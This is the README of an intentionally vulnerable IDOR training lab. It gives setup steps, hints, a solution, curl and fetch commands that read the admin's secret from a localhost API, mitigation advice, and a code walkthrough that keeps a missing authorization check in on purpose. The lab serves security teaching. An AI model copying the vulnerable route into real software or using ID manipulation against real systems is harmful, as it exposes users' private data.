# 👤 IDOR (Insecure Direct Object Reference) Lab

## Overview

This lab demonstrates IDOR vulnerabilities, where an application exposes direct references to internal objects without proper authorization checks. Attackers can manipulate these references to access unauthorized data.

## Vulnerability Type

**CWE-639: Authorization Bypass Through User-Controlled Key**

IDOR is a type of access control vulnerability that occurs when an application provides direct access to objects based on user input.

## Learning Objectives

- Understand IDOR vulnerabilities
- Learn the difference between authentication and authorization
- Practice API manipulation techniques
- Explore access control bypass methods

## Challenge Details

- **Port:** 3001
- **Difficulty:** Easy
- **Objective:** Find and access the admin's secret

## Setup

```bash
npm install
npm start
```

Access the lab at: http://localhost:3001

## Getting Started

1. Log in with: `john / password`
2. Observe the user ID in the URL or API requests
3. Try accessing other users' data
4. Find the admin's secret to get the flag

## Hints

<details>
<summary>Hint 1 (Click to reveal)</summary>

After logging in as John, check the API endpoint used to fetch user data.

</details>

<details>
<summary>Hint 2 (Click to reveal)</summary>

The endpoint `/api/user/:id` returns user information. What happens if you change the ID?

</details>

<details>
<summary>Hint 3 (Click to reveal)</summary>

Try accessing `/api/user/1` (admin's profile) to see their secret field.

</details>

<details>
<summary>Solution (Click to reveal)</summary>

1. Login as john
2. Open browser dev tools (F12)
3. Make a GET request to `/api/user/1`
4. The admin's secret contains the flag
</details>

## API Endpoints

- `POST /api/login` - Login endpoint
- `POST /api/logout` - Logout endpoint
- `GET /api/me` - Get current user info
- `GET /api/user/:id` - **VULNERABLE:** Get any user's profile by ID

## Users Database

| ID  | Username | Password | Role  | Secret       |
| --- | -------- | -------- | ----- | ------------ |
| 1   | admin    | admin123 | admin | 🚩 FLAG      |
| 2   | john     | password | user  | Private note |
| 3   | alice    | alice123 | user  | Private note |

## Real-World Impact

IDOR vulnerabilities have caused:

- Exposure of millions of user records
- Access to private messages and documents
- Financial data breaches
- Medical record exposure
- Unauthorized account modifications

**Famous Examples:**

- Facebook Graph API IDOR
- Instagram private photo exposure
- Various banking application breaches
- Healthcare system data leaks

## Exploitation Techniques

### Using Browser Dev Tools

1. Open Developer Tools (F12)
2. Go to Console tab
3. Execute:

```javascript
fetch("/api/user/1")
  .then((r) => r.json())
  .then(console.log);
```

### Using curl

```bash
# Login first to get session cookie
curl -X POST http://localhost:3001/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"john","password":"password"}' \
  -c cookies.txt

# Access admin profile
curl http://localhost:3001/api/user/1 \
  -b cookies.txt
```

### Using Postman

1. POST to `/api/login` with john's credentials
2. Save the session cookie
3. GET `/api/user/1` with the session cookie

## Mitigation

To prevent IDOR vulnerabilities:

1. **Implement proper authorization checks**

   ```javascript
   // Check if user can access this resource
   if (req.userId !== targetId && req.user.role !== "admin") {
     return res.status(403).json({ error: "Forbidden" });
   }
   ```

2. **Use indirect references**
   - Use UUIDs instead of sequential IDs
   - Map user input to internal references

3. **Apply access control lists (ACLs)**
   - Check permissions for every request
   - Implement role-based access control (RBAC)

4. **Validate on the server-side**
   - Never trust client-side validation alone
   - Always verify user permissions server-side

5. **Log and monitor access patterns**
   - Track unusual access patterns
   - Alert on suspicious behavior

## Code Walkthrough

The vulnerable code in `server.js`:

```javascript
// ❌ VULNERABLE: No authorization check!
app.get("/api/user/:id", authMiddleware, (req, res) => {
  const targetId = parseInt(req.params.id, 10);
  const targetUser = users[targetId];

  // Missing authorization check here!
  // Should verify: req.userId === targetId

  res.json({
    id: targetUser.id,
    secret: targetUser.secret, // Exposed!
  });
});
```

## References

- [OWASP - IDOR](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
- [CWE-639](https://cwe.mitre.org/data/definitions/639.html)
- [PortSwigger - IDOR](https://portswigger.net/web-security/access-control/idor)

---

**Happy Hacking! 🚩**
